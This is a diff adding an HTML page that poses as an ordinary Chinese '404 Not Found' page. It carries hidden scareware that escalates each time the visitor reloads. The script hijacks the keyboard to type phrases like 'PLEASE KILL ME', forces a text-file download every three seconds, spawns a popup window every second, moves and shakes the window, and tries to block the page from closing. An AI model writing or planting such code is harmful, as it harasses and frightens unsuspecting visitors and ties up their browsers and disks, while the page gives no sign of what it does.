@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #ffffff;
+            color: #000000;
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+            transition: all 0.5s;
+        }
+
+        .container {
+            text-align: center;
+            padding: 50px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .eye {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: #fff;
+            border-radius: 50%;
+            border: 2px solid #000;
+            display: none;
+        }
+
+        .pupil {
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            background: #000;
+            border-radius: 50%;
+            transition: all 0.1s;
+        }
+
+        .blood-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.1);
+            pointer-events: none;
+            display: none;
+        }
+
+        .scary-text {
+            position: fixed;
+            color: #ff0000;
+            font-size: 24px;
+            animation: flicker 0.1s infinite;
+            display: none;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.1; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes shake {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(10px, 10px); }
+            50% { transform: translate(-10px, -10px); }
+            75% { transform: translate(10px, -10px); }
+            100% { transform: translate(-10px, 10px); }
+        }
+
+        .curse-input {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            color: #ff0000;
+            font-size: 24px;
+            background: transparent;
+            border: none;
+            outline: none;
+            z-index: 9999;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>404 - 页面未找到</h1>
+        <p>您请求的页面不存在</p>
+    </div>
+    <div class="blood-overlay"></div>
+    <input type="text" class="curse-input" id="curseInput">
+
+    <script>
+        // 初始化计数器
+        let count = localStorage.getItem('refreshCount') || 0;
+        count = parseInt(count) + 1;
+        localStorage.setItem('refreshCount', count);
+
+        // 阶段计算
+        let stage = 0;
+        let threshold = 10;
+        let tempCount = count;
+        while(tempCount >= threshold) {
+            stage++;
+            tempCount -= threshold;
+            threshold = Math.max(1, threshold - 1);
+        }
+
+        // 应用恐怖效果
+        if(stage > 0) {
+            // 基础效果
+            document.body.style.backgroundColor = '#220000';
+            document.querySelector('.blood-overlay').style.display = 'block';
+
+            // 恐怖文字
+            const texts = ['What are you looking for?', 'You cant escape', 'I see you', 'Hehehe...'];
+            setInterval(() => {
+                const text = document.createElement('div');
+                text.className = 'scary-text';
+                text.style.left = Math.random() * 90 + '%';
+                text.style.top = Math.random() * 90 + '%';
+                text.textContent = texts[Math.floor(Math.random()*texts.length)];
+                document.body.appendChild(text);
+                setTimeout(() => text.remove(), 2000);
+            }, 3000);
+
+            // 第二阶段：眼球和鼠标
+            if(stage >= 2) {
+                // 创建眼球
+                const eyes = [];
+                for(let i=0; i<2; i++) {
+                    const eye = document.createElement('div');
+                    eye.className = 'eye';
+                    const pupil = document.createElement('div');
+                    pupil.className = 'pupil';
+                    eye.appendChild(pupil);
+                    document.body.appendChild(eye);
+                    eyes.push(eye);
+                    eye.style.display = 'block';
+                }
+
+                // 眼球跟踪
+                document.addEventListener('mousemove', (e) => {
+                    eyes.forEach((eye, index) => {
+                        const offset = index === 0 ? -60 : 60;
+                        eye.style.left = (e.clientX - 25 + offset) + 'px';
+                        eye.style.top = (e.clientY - 25) + 'px';
+
+                        const rect = eye.getBoundingClientRect();
+                        const centerX = rect.left + rect.width/2;
+                        const centerY = rect.top + rect.height/2;
+                        const angle = Math.atan2(e.clientY - centerY, e.clientX - centerX);
+                        const distance = Math.min(15, 
+                            Math.sqrt((e.clientX - centerX)**2 + (e.clientY - centerY)**2)/10);
+
+                        eye.querySelector('.pupil').style.transform = 
+                            `translate(${Math.cos(angle)*distance}px, ${Math.sin(angle)*distance}px)`;
+                    });
+                });
+
+                // 鼠标抖动
+                let mouseCounter = 0;
+                document.addEventListener('mousemove', () => {
+                    if(mouseCounter++ % 5 === 0) {
+                        window.scrollBy(
+                            Math.random() * 10 - 5,
+                            Math.random() * 10 - 5
+                        );
+                    }
+                });
+            }
+
+            // 第三阶段：键盘控制和下载
+            if(stage >= 3) {
+                const curses = ['GOD ', 'PLEASE KILL ME ', 'SOS ', '666 '];
+                let curseIndex = 0;
+                const input = document.getElementById('curseInput');
+
+                // 劫持键盘输入
+                document.addEventListener('keydown', (e) => {
+                    e.preventDefault();
+                    const currentCurse = curses[curseIndex % curses.length];
+                    input.value = currentCurse.slice(0, input.value.length + 1);
+                    
+                    if(input.value === currentCurse) {
+                        curseIndex++;
+                        input.value = '';
+                    }
+                });
+
+                // 生成地狱文件
+                setInterval(() => {
+                    const content = ` Well done, you found me. This is actually just an error report message, more likely You can no longer escape now \n heaven \n god \n hell \n devil \n 新しい命の誕生 \n 生命の奇跡 \n 浜辺におびえるワタナベ鳥 \n${Date.now()}`;
+                    const blob = new Blob([content], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `nullfile-${Date.now()}.hell`;
+                    a.click();
+                    URL.revokeObjectURL(url);
+                }, 3000);
+            }
+
+            // 最终阶段：窗口崩溃
+            if(stage >= 4) {
+                // 窗口抖动
+                document.body.style.animation = 'shake 0.1s infinite';
+
+                // 弹窗攻击
+                setInterval(() => {
+                    try {
+                        const w = window.open('', Math.random().toString(36).substr(2,5), 
+                            `width=200,height=200,left=${Math.random()*500},top=${Math.random()*500}`);
+                        w.document.body.style.background = '#000';
+                        w.document.body.innerHTML = '<h1 style="color:red;">hell</h1>';
+                    } catch(e) {}
+                }, 1000);
+
+                // 移动窗口
+                setInterval(() => {
+                    try {
+                        window.moveTo(
+                            Math.random() * screen.availWidth,
+                            Math.random() * screen.availHeight
+                        );
+                    } catch(e) {}
+                }, 200);
+
+                // 阻止关闭
+                window.onbeforeunload = function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                };
+            }
+        }
+
+        // 重置计数器
+        if(count >= 50) {
+            localStorage.removeItem('refreshCount');
+        }
+    </script>
+</body>
+</html>
